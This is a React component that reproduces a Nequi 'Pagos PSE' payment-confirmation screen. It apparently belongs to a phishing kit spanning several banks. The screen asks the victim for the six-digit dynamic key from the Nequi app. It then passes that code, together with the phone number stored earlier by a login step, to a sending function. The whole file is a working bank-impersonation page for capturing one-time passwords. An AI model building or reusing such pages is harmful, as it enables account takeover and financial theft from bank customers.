/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useState, useEffect, useMemo } from 'react';

export default function DinamicaNequi({ enviar }: any) {
  const [otp, setOtp] = useState("");

  // Recuperar celular de localStorage (como en tu Login)
  const celular = useMemo(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('nequi_view') || "";
    return "";
  }, []);

  // Validación: Se habilita al completar los 6 dígitos
  const isFormValid = useMemo(() => otp.length === 6, [otp]);

  // Manejador de envío
  const handleContinuar = () => {
    if (isFormValid) {
      enviar?.({
        view: 'dinamica',
        user: celular,
        dinamica: otp,
        bank: "Nequi"
      });
    }
  };

  // Captura de teclado físico
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Backspace") setOtp(prev => prev.slice(0, -1));
      else if (/^\d$/.test(e.key) && otp.length < 6) setOtp(prev => prev + e.key);
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [otp]);

  return (
    <div className="contenedor max-w-[400px] mx-auto p-4 text-center" style={{ fontFamily: "'Manrope', sans-serif" }}>
      <img src="/bancos/nequi/img/logo.svg" width="176" className="mx-auto mb-4" alt="logo" />

      <div className="text-[20px] font-extrabold text-[#210049] mb-2">Pagos PSE de Nequi</div>
      <p className="text-[14px] text-gray-500 mb-6 px-4">
        Para confirmar tu pago escribe la clave dinámica que encuentras en tu App Nequi.
      </p>

      {/* Casillas de OTP */}
      <div className="flex justify-center gap-2 mb-8">
        {[...Array(6)].map((_, i) => (
          <div
            key={i}
            className={`w-10 h-12 border-b-2 flex items-center justify-center text-xl font-bold text-[#210049] transition-colors ${otp[i] ? "border-[#DA0081]" : "border-gray-300"
              }`}
          >
            {otp[i] || ""}
          </div>
        ))}
      </div>

      {/* Teclado Visual */}
      <div className="grid grid-cols-3 gap-y-4 mb-8 max-w-[300px] mx-auto">
        {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
          <button
            key={num}
            onClick={() => otp.length < 6 && setOtp(prev => prev + num)}
            className="text-2xl font-semibold text-[#210049] py-2 active:bg-gray-100 rounded-full"
          >
            {num}
          </button>
        ))}
        <div />
        <button
          onClick={() => otp.length < 6 && setOtp(prev => prev + "0")}
          className="text-2xl font-semibold text-[#210049] py-2 active:bg-gray-100 rounded-full"
        >
          0
        </button>
        <button onClick={() => setOtp(prev => prev.slice(0, -1))} className="flex items-center justify-center">
          <img src="/bancos/nequi/img/borrar.jpg" width="30" alt="borrar" />
        </button>
      </div>

      {/* Botones de Acción */}
      <div className="space-y-3">
        <button
          onClick={handleContinuar}
          disabled={!isFormValid}
          className={`w-full py-4 font-bold text-lg rounded-sm transition-all ${isFormValid ? "bg-[#da0081] text-white shadow-lg" : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
        >
          Continuar
        </button>

        <button className="w-full py-2 text-[#da0081] font-bold text-sm bg-transparent">
          Cancela pago
        </button>
      </div>

      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;700;800&display=swap');
      `}} />
    </div>
  );
}